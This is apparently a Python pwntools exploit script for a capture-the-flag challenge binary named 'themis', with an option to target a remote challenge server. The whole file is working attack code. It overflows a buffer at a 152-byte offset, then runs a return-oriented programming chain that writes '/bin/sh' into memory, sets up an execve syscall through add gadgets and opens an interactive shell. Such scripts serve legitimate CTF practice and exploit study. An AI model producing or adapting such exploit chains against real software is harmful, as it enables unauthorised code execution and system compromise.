#!/usr/bin/env python3

from pwn import *

elf = ELF("./themis")
rop = ROP(elf)
io = process(elf.path)

context.update(binary=elf.path, encoding='latin-1')

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()

        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("challenges.hackrocks.com", 27383)
    else:
        return process([elf.path])


OFFSET = 152
rsi_rdi_www = elf.sym.g
xor_rax_rax = elf.sym.g1
pop_rsi_rdx = elf.sym.g2
add_rax_7 = elf.sym.g3
add_rax_8 = elf.sym.g4
add_rax_9 = elf.sym.g5
pop_rdi_rsi = elf.sym.g6
syscall = elf.sym.g7
# rsi: binsh string
# rdi: __data_start
rop(rdi=elf.sym.__data_start, rsi=b"/bin/sh\0")
rop.call(rsi_rdi_www)
rop.call(xor_rax_rax)
[rop.call(add_rax_9) for i in range(5)]
[rop.call(add_rax_7) for i in range(2)]
rop(rsi=0)
rop.call(syscall)
def main():
    io = start()
    io.clean_and_log()
    payload = flat({OFFSET: rop.chain()})
    with open("payload.dump", "wb") as f:
        f.write(payload)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
